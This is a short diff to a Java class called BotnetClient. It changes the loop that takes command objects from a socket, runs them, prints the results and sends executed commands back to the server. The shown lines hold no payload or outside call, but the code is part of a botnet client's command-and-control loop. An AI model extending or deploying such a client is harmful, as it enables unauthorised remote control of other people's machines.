@@ -40,13 +40,23 @@ public class BotnetClient {
         String fromUser;
 
         while ((commandInstructions = inCommand.getInstructions()) != null){
-            System.out.println("Running Command" + commandInstructions);
+            System.out.println("Running Command " + inCommand.getCommandName());
+            
+
             String result = commandP.processCommand(inCommand);
-            System.out.println(result);
+
+            if (result.equalsIgnoreCase("exiting")){
+                break;
+            }
+            
+            System.out.println("Command Result: " + result);
+            // System.out.println("Command Response: " + inCommand.getResponse());
+            // System.out.println("Command Error Status: " + inCommand.getErrorStatus());
+            // System.out.println("Command Is Executed: " + inCommand.getIsExecuted());
+
             //mutate the command
-            if (inCommand.getErrorStatus() && inCommand.getIsExecuted()){
-                Command comand = new Command("thing");
-                out.writeObject(comand);
+            if (!inCommand.getErrorStatus() && inCommand.getIsExecuted()){
+                out.writeObject(inCommand);
             }
 
             try{
@@ -57,7 +67,6 @@ public class BotnetClient {
                 System.err.println("BotNetClient: Problem reading object: class not found");
                 System.exit(1);
             }
-            //send the command back to the command queue
 
         }
 
@@ -65,6 +74,5 @@ public class BotnetClient {
         in.close();
         stdIn.close();
         socket.close();
-
     }    
 }
